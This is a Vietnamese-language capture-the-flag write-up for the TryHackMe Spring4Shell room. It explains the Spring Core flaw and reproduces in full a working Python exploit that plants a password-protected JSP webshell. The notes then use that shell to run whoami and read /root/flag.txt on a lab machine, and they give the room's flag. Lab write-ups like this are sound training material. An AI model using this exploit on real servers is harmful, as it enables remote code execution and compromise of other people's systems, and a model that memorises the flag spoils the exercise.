- link bt: https://tryhackme.com/room/spring4shell<br>

*. task 1<br>
- lỗ hổng: Spring4Shell ảnh hưởng đến 1 thành phần trong Spring Core <br>

*. task 2<br>
- lỗ hổng này cho phép kẻ tấn công tải 1 webshell (đoạn mã chấp nhận lệnh từ kẻ tấn công mà máy chủ web sau đó bị lừa thực thi) lên máy chủ dễ bị tấn công, thực hiện lệnh từ xa
- spring mvc là 1 phần của spring framework: nó can tự động khởi tạo và điền vào 1 đối tượng của 1 lớp đc chỉ định khi yêu cầu đc thực hiện trên các tham số đc gửi đến điểm cuối
- -> can lợi dụng để ghi đè
- Spring4Shell: buộc ứng dụng ghi 1 tệp .jsp độc hại vào máy chủ web -> thực thi lệnh từ xa<br>

*. task 3<br>
- nội dung tệp exploit.py<br>
```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat exploit.py                    
#!/usr/bin/env python3
# Spring4Shell Exploit
# Original Exploit: https://github.com/BobTheShoplifter/Spring4Shell-POC/
# Modified by: AG | MuirlandOracle

import requests
import argparse
from urllib.parse import urljoin

def exploit(url, filename, password, directory):
    headers = {"suffix":"%><!--//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"
    }

    data = f"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{password}%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/{directory}&class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="


    try:
        requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(url, f"{filename}.jsp")
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"Shell Uploaded Successfully!\nYour shell can be found at: {shellurl}?pwd={password}&cmd=whoami")
        else:
            print("Exploit failed to upload")
    except Exception as e:
        print(e)
        pass




if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Spring4Shell RCE Proof of Concept')
    parser.add_argument('url', help='Target URL')
    parser.add_argument("-f","--filename", help="Name of the file to upload (Default tomcatwar.jsp)", default="tomcatwar.jsp")
    parser.add_argument("-p","--password", help="Password to protect the shell with (Default: thm)", default="thm")
    parser.add_argument("-d","--directory", help="The upload path for the file (Default: ROOT)", default="ROOT")
    args = parser.parse_args()
    exploit(args.url, args.filename.split(".")[0], args.password, args.directory)
```

1. What is the flag in /root/flag.txt?<br>
- truy cập: http://10.10.125.191/tomcatwar.jsp?pwd=thm&cmd=whoami
- sau đó truy cập: http://10.10.125.191/tomcatwar.jsp?pwd=thm&cmd=cat /root/flag.txt<br>

As: THM{NjAyNzkyMjU0MzA1ZWMwZDdiM2E5YzFm}
